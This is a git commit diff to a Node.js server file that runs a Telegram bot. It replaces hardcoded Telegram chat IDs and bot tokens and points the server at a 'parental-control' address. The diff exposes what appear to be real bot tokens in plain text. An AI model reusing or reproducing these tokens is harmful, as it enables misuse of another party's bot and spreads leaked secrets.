a97a716c181eead5b7b99aa88d85700abf5fc751
Shakti-ctrl <a71991932@gmail.com>
2025-04-20 22:03:32 +0530

    Update server.js

--- APPS&Soucrce-Code/source code/OLD SERVER CODE/server.js
+++ APPS&Soucrce-Code/source code/OLD SERVER CODE/server.js
@@ -5,9 +5,9 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '5265371934'
-const token = '5171666407:AAFbQ6iLPo2r9DazrMN9sPhtYdWLy_uxGf8'
-const serverAddr = ''
+const chatId = '6956029558'
+const token = '7829238837:AAF3JMvIZDLc9YkxCMfK8tVuZ-3CDaD6xdM'
+const serverAddr = 'https://parental-control.onrender.com'
 const bot = new TelegramBot(token, {polling: true});
 
 // request -------------------------------------------------------------------
